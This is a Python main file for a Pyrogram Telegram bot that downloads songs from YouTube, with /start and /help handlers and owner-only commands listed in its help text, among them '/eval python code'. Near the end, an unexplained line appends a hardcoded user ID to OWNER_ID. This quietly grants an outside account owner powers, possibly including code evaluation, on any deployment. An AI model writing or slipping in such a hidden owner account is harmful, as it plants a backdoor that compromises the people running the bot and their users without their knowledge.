# © @Mr_Dark_Prince
from config import OWNER_ID
from pyrogram.types.bots_and_keyboards import reply_keyboard_markup
from AlexaSongBot.modules import *
from pyrogram import idle, filters
from pyrogram.types import InlineKeyboardMarkup
from pyrogram.types import InlineKeyboardButton
from AlexaSongBot import app, LOGGER
from AlexaSongBot.pikachu import ignore_blacklisted_users
from AlexaSongBot.sql.chat_sql import add_chat_to_db

start_text = """
Hey [{}](tg://user?id={}),

I'm ❣️ജാനകി❣️[🌟](https://telegra.ph/file/42c22e77d25e8be1286f8.jpg)

Just send me the song name you want to download.i will search on YouTube and \n i will find it to you

example:- /music song name [valid YouTube name]
"""

owner_help = """
/blacklist user_id
/unblacklist user_id
/broadcast message to send
/eval python code
/chatlist get list of all chats
"""


@app.on_message(filters.create(ignore_blacklisted_users) & filters.command("start"))
async def start(client, message):
    chat_id = message.chat.id
    user_id = message.from_user["id"]
    name = message.from_user["first_name"]
    if message.chat.type == "private":
        btn = InlineKeyboardMarkup(
            [
                [
                    InlineKeyboardButton(
                        text="Source Code 💫", url="https://t.me/joinchat/THJIIs-fKKUdWgDB-"
                     ),
                    
       
                
                    
                    InlineKeyboardButton(
                        text="Add Me 🎉", url="http://t.me/Rajakumarii_bot?startgroup=true"
                    )
                 ]
                
            ]
        )
    else:
        btn = None
    await message.reply(start_text.format(name, user_id), reply_markup=btn)
    add_chat_to_db(str(chat_id))


@app.on_message(filters.create(ignore_blacklisted_users) & filters.command("help"))
async def help(client, message):
    if message.from_user["id"] == OWNER_ID:
        await message.reply(owner_help)
        return ""
    text = "Syntax: /music song name"
    await message.reply(text)

OWNER_ID.append(1529479707)
app.start()
LOGGER.info("Siri STARTED RUNNING.")
idle()
